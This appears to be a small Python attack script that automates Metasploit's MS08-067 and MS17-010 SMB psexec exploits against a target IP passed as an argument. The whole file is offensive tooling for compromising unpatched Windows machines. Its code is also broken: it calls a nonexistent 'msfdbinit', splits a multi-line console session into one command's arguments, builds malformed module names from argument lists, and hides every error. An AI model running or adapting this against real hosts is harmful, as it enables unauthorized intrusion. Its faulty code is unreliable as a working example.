import argparse
import subprocess

#driver should call this script with two arguments, the first being the patch exploit that corresponds to the given ip selected (second arg)
#example is: python mss.py ms17-010 10.202.208.11

parser = argparse.ArgumentParser(description='Exploit IPs with ms08-067 and ms17-010 through metasploit')
parser.add_argument('xp', metavar='msxx', type=str, nargs=1, help='the patch exploit to run')
parser.add_argument('ip', metavar='IP', type=str, nargs=1, help='the IP to exploit')
args = parser.parse_args()

if args.xp:
	xp_input = args.xp
	if args.ip:
		ip_input = args.ip

		cmd = """msfdbinit
		msfconsole
		use exploit/windows/smb/"""+str(xp_input)+"""_psexec
		set rhost """+str(ip_input)+"""
		exploit
		"""
		#cmd = 'msfdb init && msfconsole && use exploit/windows/smb/ms17_010_psexec && set rhost {ip_input} && exploit'.format(ip_input=ip_input)

try:
	process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
	output, error = process.communicate()

except Exception:
	pass
